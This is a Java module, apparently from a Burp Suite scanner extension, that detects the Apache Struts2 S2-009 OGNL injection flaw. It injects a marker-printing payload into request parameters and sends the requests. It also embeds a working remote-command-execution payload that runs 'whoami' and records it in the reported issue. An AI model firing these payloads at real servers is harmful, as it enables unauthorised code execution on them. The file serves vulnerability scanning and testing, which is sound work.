package module.java.vul;

import burp.*;
import module.Util;

import java.io.PrintWriter;
import java.net.URLEncoder;
import java.util.Arrays;
import java.util.List;

public class S2_009 extends IModule {
    public String randomMark = Util.getRandomString(16);
    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
    public String poc =
        "abcedfghij=" +
        "(" +
        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
        "#_memberAccess[\"allowStaticMethodAccess\"]=true," +
        "#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET," +
        "#out=@org.apache.struts2.ServletActionContext@getResponse()," +
        "#out.getWriter().print(\"" + injectMark[0] + "\")," +
        "#out.getWriter().print(\"" + injectMark[1] + "\")," +
        "#out.getWriter().flush()," +
        "#out.getWriter().close()" +
        ")(meh)" +
        "&z[(abcedfghij)('meh')]=true";
    public String exp =
        "foo=" +
        "(" +
        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
        "#_memberAccess[\"allowStaticMethodAccess\"]=true," +
        "#_memberAccess.excludeProperties=@java.util.Collections@EMPTY_SET," +
        "#cmd=\"whoami\"," +
        "#ret=@java.lang.Runtime@getRuntime().exec(#cmd)," +
        "#data=new java.io.DataInputStream(#ret.getInputStream())," +
        "#res=new byte[4]," +
        "#data.readFully(#res)," +
        "#echo=new java.lang.String(#res)," +
        "#out=@org.apache.struts2.ServletActionContext@getResponse()," +
        "#out.getWriter().print(#echo)," +
        "#out.getWriter().flush()," +
        "#out.getWriter().close()" +
        ")(meh)" +
        "&z[(foo)('meh')]=true";

    @Override
    public IScanIssue start(){
        IHttpService httpService = iHttpRequestResponse.getHttpService();
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        byte[] request = iHttpRequestResponse.getRequest();

        List<IParameter> parameters = requestInfo.getParameters();
        for (IParameter parameter: parameters) {
            if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
                String toPoc = poc.replace("abcedfghij", parameter.getName());

                String[] params = toPoc.split("&");
                byte[] newRequest = request;
                for (String param : params) {
                    String[] tmp = param.split("=", 2);
                    String parameterName = tmp[0];
                    String parameterValue = tmp[1];

                    IParameter newParameter = helpers.buildParameter(URLEncoder.encode(parameterName), URLEncoder.encode(parameterValue), parameter.getType());
                    newRequest = helpers.updateParameter(newRequest, newParameter);
                }

                IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
                byte[] response = newHttpRequestResponse.getResponse();
                IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
                byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);
                String bodyText = new String(body);
                if (bodyText.contains(randomMark)) {
                    this.iHttpRequestResponse = newHttpRequestResponse;
                    this.detail = URLEncoder.encode(exp)
                            .replace("%26", "&")
                            .replace("%3D", "=")
                            .replace("foo", parameter.getName());
                    return creatCustomScanIssue();
                }
            }
        }

        return null;
    }
}
